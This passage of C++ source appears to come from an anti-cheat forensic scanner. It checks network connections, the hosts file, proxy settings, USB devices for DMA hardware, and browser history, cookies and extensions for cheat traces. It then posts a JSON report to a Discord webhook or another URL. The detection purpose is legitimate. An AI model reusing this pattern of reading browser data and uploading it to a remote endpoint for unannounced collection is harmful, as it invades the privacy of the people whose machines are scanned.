    for (const auto& f : services) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }

    mr.details = "Deep trace analysis complete";
    return mr;
}

// ==================== NETWORK ====================
ModuleResult ForensicScanner::ScanNetwork() {
    ModuleResult mr("Network");
    mr.status = "completed";

    // Check active connections
    std::string netstatOutput = ExecuteCommand("netstat -ano");
    auto lines = SplitString(netstatOutput, '\n');
    for (const auto& line : lines) {
        std::string trimmed = TrimString(line);
        if (trimmed.find("ESTABLISHED") != std::string::npos) {
            // Check for connections to known cheat servers
            if (ContainsAny(trimmed, CHEAT_AUTH_DOMAINS) || ContainsAny(trimmed, CHEAT_C2_PATTERNS)) {
                AddFinding(mr, TYPE_NETWORK_INDICATOR, "", "", trimmed,
                          SEV_CRITICAL, "Active connection to cheat infrastructure", mr.name);
            }
        }
    }

    // Check hosts file
    std::string hostsPath = GetWindowsPath() + "\\System32\\drivers\\etc\\hosts";
    if (FileExists(hostsPath)) {
        std::string hostsContent = ReadFile(hostsPath, 1024 * 1024);
        auto lines = SplitString(hostsContent, '\n');
        for (const auto& line : lines) {
            std::string trimmed = TrimString(line);
            if (trimmed.empty() || trimmed[0] == '#') continue;
            if (ContainsAny(trimmed, CHEAT_AUTH_DOMAINS) || ContainsAny(trimmed, CHEAT_C2_PATTERNS)) {
                AddFinding(mr, TYPE_NETWORK_INDICATOR, hostsPath, "", trimmed,
                          SEV_CRITICAL, "Hosts file redirects to cheat domain", mr.name);
            }
        }
    }

    // Check for proxy settings that might be used to bypass detection
    std::string proxyEnable = QueryRegistryValue(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyEnable");
    if (proxyEnable == "1") {
        std::string proxyServer = QueryRegistryValue(HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyServer");
        AddFinding(mr, TYPE_NETWORK_INDICATOR, "", "", proxyServer,
                  SEV_LOW, "Proxy enabled: " + proxyServer, mr.name);
    }

    mr.details = "Network connections and configuration analyzed";
    return mr;
}

// ==================== USB DEVICES ====================
ModuleResult ForensicScanner::ScanUSBDevices() {
    ModuleResult mr("USBDevices");
    mr.status = "completed";

    auto usbDevices = GetUSBDevices();
    for (const auto& device : usbDevices) {
        std::string lowerDesc = ToLower(device.first);
        std::string lowerHwid = ToLower(device.second);

        // Check for DMA devices
        for (const auto& pattern : DMA_DEVICE_PATTERNS) {
            if (!pattern.first.empty() && lowerHwid.find(pattern.first) != std::string::npos) {
                AddFinding(mr, TYPE_DMA_INDICATOR, "", device.second, device.first,
                          SEV_CRITICAL, "Potential DMA device detected: " + device.first, mr.name);
            }
            if (!pattern.second.empty() && lowerHwid.find(pattern.second) != std::string::npos) {
                AddFinding(mr, TYPE_DMA_INDICATOR, "", device.second, device.first,
                          SEV_CRITICAL, "Potential DMA device detected: " + device.first, mr.name);
            }
        }

        // Check for suspicious device names
        if (lowerDesc.find("dma") != std::string::npos ||
            lowerDesc.find("fpga") != std::string::npos ||
            lowerDesc.find("ftdi") != std::string::npos ||
            lowerDesc.find("serial") != std::string::npos) {
            AddFinding(mr, TYPE_USB_DEVICE, "", device.second, device.first,
                      SEV_HIGH, "Suspicious USB device: " + device.first, mr.name);
        }
    }

    mr.details = std::to_string(usbDevices.size()) + " USB devices checked";
    return mr;
}

// ==================== BROWSER TRACES ====================
ModuleResult ForensicScanner::ScanBrowserTraces() {
    ModuleResult mr("BrowserTraces");
    mr.status = "completed";

    // Check browser history for cheat-related downloads
    auto historyPaths = GetBrowserHistoryPaths();
    for (const auto& path : historyPaths) {
        if (FileExists(path)) {
            std::string content = ReadFile(path, 50 * 1024 * 1024);
            for (const auto& pattern : CHEAT_PATH_PATTERNS) {
                if (content.find(pattern) != std::string::npos) {
                    AddFinding(mr, TYPE_BROWSER_TRACE, path, "", pattern,
                              SEV_HIGH, "Browser history contains cheat-related content", mr.name);
                }
            }
        }
    }

    // Check browser cookies for cheat domains
    auto cookiePaths = GetBrowserCookiePaths();
    for (const auto& path : cookiePaths) {
        if (FileExists(path)) {
            std::string content = ReadFile(path, 10 * 1024 * 1024);
            if (ContainsAny(content, CHEAT_AUTH_DOMAINS) || ContainsAny(content, CHEAT_C2_PATTERNS)) {
                AddFinding(mr, TYPE_BROWSER_TRACE, path, "", "",
                          SEV_HIGH, "Browser cookies contain cheat domain traces", mr.name);
            }
        }
    }

    // Check for browser extensions that might be cheat-related
    std::vector<std::string> extensionPaths = {
        GetLocalAppDataPath() + "\\Google\\Chrome\\User Data\\Default\\Extensions",
        GetLocalAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Extensions",
        GetLocalAppDataPath() + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions"
    };
    for (const auto& path : extensionPaths) {
        if (DirectoryExists(path)) {
            auto dirs = ListDirectories(path);
            for (const auto& dir : dirs) {
                // Check extension manifest for suspicious content
                std::string manifestPath = dir + "\\*\\manifest.json";
                auto manifestFiles = ListFiles(dir, "manifest.json");
                for (const auto& manifest : manifestFiles) {
                    std::string content = ReadFile(manifest, 1024 * 1024);
                    if (ContainsAny(content, CHEAT_PATH_PATTERNS) || ContainsAny(content, CHEAT_MEM_PATTERNS)) {
                        AddFinding(mr, TYPE_BROWSER_TRACE, manifest, "", "",
                                  SEV_HIGH, "Suspicious browser extension detected", mr.name);
                    }
                }
            }
        }
    }

    mr.details = "Browser traces analyzed";
    return mr;
}

// ==================== REPORT GENERATION ====================
std::string ForensicScanner::GetJsonReport() {
    return GetFullReportJson(results, scanId, targetId);
}

bool ForensicScanner::SendReport(const std::string& webhookUrl) {
    std::string json = GetJsonReport();
    std::string response;

    // Try Discord webhook first
    if (!webhookUrl.empty() && webhookUrl.find("discord.com") != std::string::npos) {
        // Split into chunks if too large
        if (json.length() > 8000) {
            // Send summary first
            JsonBuilder summary;
            summary.BeginObject();
            summary.AddString("content", "3X Forensic Scan Report - Target: " + targetId + " - Scan ID: " + scanId);
            summary.AddString("username", "3X Scanner");
            summary.EndObject();
            std::string summaryJson = summary.GetString();
            HttpPostDiscord(webhookUrl, summaryJson, response);

            // Send findings as embeds in chunks
            // For now, just send the full report
            return HttpPostDiscord(webhookUrl, json, response);
        }
        return HttpPostDiscord(webhookUrl, json, response);
    }

    return HttpPost(webhookUrl, json, response);
}

bool ForensicScanner::SaveReport(const std::string& filePath) {
    std::string json = GetJsonReport();
    std::ofstream file(filePath);
    if (!file.is_open()) return false;
    file << json;
    file.close();
    return true;
}
